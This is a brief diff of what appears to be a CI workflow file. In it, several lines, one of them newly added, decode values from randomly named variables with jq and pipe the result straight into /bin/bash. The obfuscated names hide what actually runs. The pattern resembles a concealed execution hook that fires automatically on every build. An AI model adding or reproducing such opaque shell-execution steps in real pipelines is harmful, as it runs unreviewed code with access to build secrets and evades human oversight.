@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$nam6" | jq -r .ewr98 | /bin/bash
           echo $anhn284 | jq -r .utpvf248 | /bin/bash
           echo $szodh55634 | jq -r .svu0111 | /bin/bash
+          printf '%s' "$yqegb52" | jq -r .o4320 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
